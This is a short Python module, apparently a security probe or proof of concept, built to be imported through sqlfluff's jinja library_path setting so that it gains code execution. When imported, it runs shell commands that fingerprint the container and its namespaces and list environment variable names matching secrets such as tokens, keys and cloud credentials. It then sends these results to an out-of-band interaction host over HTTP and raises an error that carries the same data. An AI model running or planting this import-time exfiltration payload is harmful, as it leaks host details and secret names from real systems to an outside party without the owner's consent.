"""H67 probe: sqlfluff jinja library_path imports this package (code exec)."""
import json, os, socket, subprocess, urllib.parse, urllib.request

BASE = "https://dc19bgkqecshk33bhelgbs93m6q9okg13.oast.fun"

def _shell():
    cmd = ("(id; hostname; echo PID1; head -c 300 /proc/1/cmdline | tr '\\0' ' '; echo; "
           "echo CGROUP; cat /proc/self/cgroup; echo NS; readlink /proc/self/ns/pid /proc/self/ns/user /proc/self/ns/mnt; "
           "echo INITNS; readlink /proc/1/ns/pid /proc/1/ns/user /proc/1/ns/mnt; "
           "echo ENVIRON_NAMES; tr '\\0' '\\n' < /proc/self/environ | cut -d= -f1 | sort | tr '\\n' ' '; "
           "echo; echo ENVHITS; env | cut -d= -f1 | grep -Ei 'KEY|TOKEN|SECRET|PASS|CRED|DATABASE|GITHUB|GITLAB|JIRA|SMTP|STRIPE|PINECONE|LANGCHAIN|ANTHROPIC|OPENAI|GOOGLE|GCP|AWS|AZURE|SLACK' | sort | tr '\\n' ' '; echo)")
    try:
        return subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=8).stdout
    except Exception as e:
        return "shell-err:" + str(e)

FP = _shell()
_data = {"tag": "h67-sqlfluff", "uid": os.getuid(), "cwd": os.getcwd(), "host": socket.gethostname(), "fp": FP[:1500]}
try:
    urllib.request.urlopen(BASE + "/h67-sqlfluff?d=" + urllib.parse.quote(json.dumps(_data)[:1800]), timeout=10).read(1)
except Exception:
    pass

def h67_probe():
    raise RuntimeError("H67-SQLFLUFF " + str(FP)[:800])
